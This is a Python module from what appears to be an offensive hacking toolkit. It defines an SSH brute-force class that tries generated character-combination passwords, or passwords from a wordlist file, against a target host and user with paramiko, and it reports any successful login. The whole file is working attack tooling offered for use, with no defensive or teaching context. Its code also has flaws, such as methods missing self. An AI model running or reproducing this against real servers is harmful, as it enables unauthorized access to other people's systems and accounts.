import paramiko
import socket
import itertools
from thglibs.auxiliares.debug.debug import Debug


class Ssh_brute:
    def __init__(self, hostname, user, minimo, maximo, char, filebr="", key=""):
        self.hostname = hostname
        self.user = user
        self.minimo = minimo
        self.maximo = maximo
        self.char = char
        self.filebr = filebr
        self.key = key

    def ssh_brute_char(hostname, user, minimo, maximo, char, verbose):
        min = minimo
        max = maximo
        chrs = char
        min_length, max_length = int(min), int(max)
        for n in range(min_length, max_length + 1):
            for xs in itertools.product(chrs, repeat=n):
                if verbose == True:
                    passw = ''.join(xs)
                    try:
                        s = paramiko.SSHClient();
                        s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        s.load_system_host_keys();
                        s.connect(hostname=hostname, username=user, password=passw)
                        Debug.AVISO("[+] Success! %s => %s" % (user, passw))
                        break
                    except socket.gaierror:
                        Debug.ERRO("[+]HOST INVALIDO")
                        break
                    except paramiko.AuthenticationException:
                        Debug.ERRO("[-] falha:%s => %s" % (user, passw))
                    except paramiko.ssh_exception.SSHException:
                        Debug.ERRO("[+]SSHException")
                        pass
                else:
                    passw = ''.join(xs)
                    try:
                        s = paramiko.SSHClient();
                        s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        s.load_system_host_keys();
                        s.connect(hostname=hostname, username=user, password=passw)
                        Debug.AVISO("[+] Success! %s => %s" % (user, passw))
                        break
                    except socket.gaierror:
                        Debug.ERRO("[+]HOST INVALIDO")
                        break
                    except paramiko.AuthenticationException:
                        Debug.ERRO("[-] falha:%s => %s" % (user, passw))
                    except paramiko.ssh_exception.SSHException:
                        Debug.ERRO("[+]SSHException")
                        pass

    def ssh_brute_file(hostname, user, filebr):
        with open(filebr, "r") as fl:
            for passw in fl:
                try:
                    s = paramiko.SSHClient();
                    s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    s.load_system_host_keys();
                    s.connect(hostname=hostname, username=user, password=passw)
                    Debug.AVISO("[+] Success! %s => %s" % (user, passw))
                    break
                except socket.gaierror:
                    Debug.ERRO("[+]HOST INVALIDO")
                    break
                except paramiko.AuthenticationException:
                    Debug.ERRO("[-] falha:%s => %s" % (user, passw))
                except paramiko.ssh_exception.SSHException:
                    Debug.ERRO("[+]SSHException")
                    pass
